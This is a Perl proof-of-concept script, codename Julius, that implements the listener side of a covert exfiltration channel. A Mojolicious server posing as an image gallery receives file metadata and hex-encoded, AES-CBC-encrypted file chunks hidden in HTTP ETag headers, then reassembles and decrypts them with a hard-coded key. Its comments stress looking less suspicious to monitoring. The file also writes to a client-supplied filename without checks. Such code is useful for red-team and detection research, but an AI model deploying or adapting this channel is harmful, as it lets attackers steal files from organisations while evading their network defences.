#!/usr/bin/perl

# Released under GPL 3.0

# Exfiltration POC with Mojolicious
# Outside script #1
# Codename Julius

# Hendrik Van Belleghem
# hendrik.vanbelleghem@gmail.com

# This script receives exfiled from the HTTP header for a GET request to a mock gallery page
# Rudimentary handshake information is stored in call to 'index page'
# Data is stored in the 'image requests'

# Handshake data is sent is clear text (for now)
# Exfil data is encoded with (for now) a simple hex conversion

# Parameters used:
# b: number of blocks
# bs: block size
# h: header tag
# fn: filename
# fs: filesize
# f: format
# e: encryption

# This script uses Mojolicious Lite (http://mojolicious.org)
# Packet content is ignored

# Improvements over Anna & Boris:
# - Browser signature less suspicious
# - Encrypted with PSK
# - Should work with all CBC supported ciphers

# Run this with: perl exfil-s.pl daemon -l http://*:8080

use Mojolicious::Lite;
use Crypt::CBC;

my $file = undef;
my $totalsize = undef;
my $counter = undef;
my %params = ();
my $encryption = "Rijndael"; # use Crypt::Rijndael in Crypt::CBC
my $psk = "Quote the Raven"; # Pre-shared key 
my $cipher;

get '/gallery/page/:page' => sub { # handle index GET
  my $c = shift;
  my $page = $c->param('page'); # Do something with this value.. if you have multiple files to exfile?
  my $etag = $c->req->headers->etag;
  my @params = split(/\;/,$etag);
  for (@params)
  { my ($k,$v) = split(/\:/,$_);
    $params{$k} = $v;
  }
  $encryption ||= $params{"e"};
  $file = $params{"fn"};
  $totalsize = $params{"fs"};
  $cipher = Crypt::CBC->new(-key => $psk,
			     -cipher => $encryption,
			     -salt   => 1,
			    ) || die "Couldn't create CBC object";
  
  open(FOO,">$file.out") || die $!; # Obviously you want to run this locally so don't overwrite the original file
  print FOO "";
  close(FOO);
  $c->render(text => "Exfil OK");
};

get '/gallery/image/:sequence' => sub { # handle GET requests for exfil data
  my $c = shift;
  my $sequence = $c->param('sequence'); # Sequence parameter included for future out-of-sequence handling
  my $etag = $c->req->headers->etag;
  my $data .= $etag;
  $counter += length($data);
  if ($counter >= $totalsize)
  { $counter = $totalsize;
    my $finalsize = $totalsize % $params{"bs"};
    $data = substr($data,0,$finalsize);
    open(FOO,">>$file.out") || die $!;
    print FOO "$data";
    close(FOO);
    open(FOO,"<$file.out") || die $!;
    { local $/; $data = <FOO>; }
    close(FOO);
    $data = $cipher->decrypt_hex($data);
    open(FOO,">$file.out") || die $!;
    print FOO "$data";
    close(FOO);
  } else
  { open(FOO,">>$file.out") || die $!;
    print FOO "$data";
    close(FOO);
  }
  $c->render(text => "Exfil OK");
};

app->start;